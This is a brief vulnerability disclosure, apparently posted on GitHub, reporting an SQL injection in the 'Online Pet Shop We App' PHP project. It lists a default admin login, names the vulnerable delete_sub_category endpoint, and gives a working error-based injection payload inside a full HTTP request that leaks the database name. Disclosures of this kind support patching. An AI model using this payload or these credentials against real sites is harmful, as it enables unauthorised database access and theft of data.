# Online Pet Shop We App v1.0 by oretnom23 has SQL injection

BUG_Author: Line

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14839/online-pet-shop-we-app-using-php-and-paypal-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /pet_shop/classes/Master.php?f=delete_sub_category,id

Vulnerability location: /pet_shop/classes/Master.php?f=delete_sub_category,id

dbname=pet_shop_db,length=11

[+] Payload: id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id


```sql
POST /pet_shop/classes/Master.php?f=delete_sub_category HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=k8u390ikl968phg971gmpmhtj5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/185292956-00334814-1310-47f8-945c-bf3d1437bea0.png)
